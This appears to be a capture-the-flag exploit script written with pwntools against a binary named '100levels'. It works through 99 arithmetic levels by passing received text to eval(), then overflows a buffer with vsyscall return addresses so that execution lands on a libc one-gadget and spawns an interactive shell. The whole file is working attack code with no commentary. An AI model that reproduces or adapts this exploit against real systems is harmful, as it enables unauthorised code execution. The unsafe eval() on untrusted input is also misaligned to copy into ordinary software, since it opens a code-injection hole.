from pwn import *
import sys

context.log_level = "debug"

system_offset = 0x0000000000045390
ret_address = 0xffffffffff600400
target_offset = 0x4526a

difference = target_offset - system_offset

def answer(eqn):
    parse = eqn[9:eqn.find("=")]
    soln = eval(parse)
    return soln

def main():
    p = process("./100levels")
    #p = remote("47.74.147.103", 20001)

    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    p.sendline("0")
    p.clean()
    p.sendline(str(difference))

    for i in range(99):
        p.recvline_contains("Level")
        eqn = p.clean()

        soln = answer(eqn)
        p.send(str(soln)+"\x00")
       
    #gdb.attach(p)
    pay = str(soln) + "\x00"
    pay = pay.ljust(0x38, "B")
    pay += p64(ret_address)*3
    log.info("Injected our vsyscall ROPs")

    p.send(pay)
    gdb.attach(p)
    p.clean()

    p.success("Shell spawned! Enjoy!")
    p.interactive()

if __name__ == "__main__":
    main()
